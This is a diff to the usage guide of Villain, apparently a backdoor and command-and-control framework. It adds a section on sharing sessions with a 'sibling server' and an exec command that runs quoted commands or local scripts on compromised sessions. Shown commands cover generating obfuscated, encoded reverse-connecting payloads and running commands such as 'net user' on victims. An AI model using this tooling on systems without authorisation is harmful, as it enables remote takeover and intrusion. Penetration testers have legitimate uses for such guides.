@@ -1,9 +1,10 @@
 # Usage Guide
-Villain was explicitly developed and tested on kali linux.  
+:warning: Villain was explicitly developed and tested on **kali linux**.  
+:warning: This guide is a work in progress currently describing a few key features. Check out Villain's introduction on youtube for more info.
 
 ## Table of contents
 1. [Generate Backdoor Payloads](Generate-Backdoor-Payloads)
-2. 
+2. [Connect With Sibling Server](Connect-With-Sibling-Server)
 
 
 ## Generate Backdoor Payloads
@@ -12,7 +13,7 @@ Use the "generate" prompt command to generate backdoor payloads for Windows or L
 ```
 generate os=<OS Type> lhost=<IP or INTERFACE> [ exec_outfile=<REMOTE PATH> domain=<DOMAIN>] [ obfuscate encode constraint_mode ]
 ```
-
+Each generated payload is going to work only once. An already used payload cannot be reused to establish a session.
 The backdoors are designed to start as new background processes. Currently supported types of backdoors:  
  - for Windows: Powershell 
  - for Linux: bash
@@ -36,4 +37,18 @@ Villain > generate os=windows lhost=192.168.12.36 exec_outfile="C:\Users\\\$env:
 
 # For Linux:
 Villain > generate os=linux lhost=192.168.12.62
+```
+
+## Connect With Sibling Server
+Use the `connect` prompt command to connect and share your backdoor sessions with another machine running Villain. 
+```
+connect <IP> <CORE SERVER PORT>
+```
+By default, the Core server port is `65001` (you can change that with `-p` when starting Villain).
+
+## The exec command
+Use the `exec `prompt command to execute a **quoted command** or **script from your file system** against a session. 
+```
+exec </path/to/local/file> <SESSION ID or ALIAS>
+exec 'net user;Get-Date' <SESSION ID or ALIAS>
 ```
